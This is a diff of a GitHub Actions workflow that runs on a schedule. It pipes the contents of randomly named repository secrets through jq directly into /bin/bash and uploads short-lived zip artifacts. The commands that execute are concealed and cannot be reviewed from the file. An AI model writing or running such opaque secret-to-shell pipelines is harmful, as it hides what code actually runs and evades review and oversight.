@@ -1,21 +1,25 @@
 name: yongfenmanchang
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '1 3/6 * * *'
 
-jobs:  # 11748
+  schedule:
+    - cron: '26 4,10,16,22 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: yongfenmanchang
         env:
-          jte7527: ${{ secrets.jte7527 }}
+          czf304: ${{ secrets.czf304 }}
         run: |
-          echo $jte7527 | jq -r .l25322 | /bin/bash
-          echo $rimr54804 | jq -r .mzmy82133 | /bin/bash
-          echo $zhiuk01155 | jq -r .uyu18 | /bin/bash
-          echo $tc9 | jq -r .mx7 | /bin/bash
-          echo $khr88698 | jq -r .xqb4247 | /bin/bash
+          printf '%s' "$czf304" | jq -r .k8 | /bin/bash
+          printf '%s' "$eld0150" | jq -r .ivk7 | /bin/bash
+          printf '%s' "$axwu307" | jq -r .eowf77626 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: WZhFkRSK
+          path: "*.zip"
+          retention-days: 1
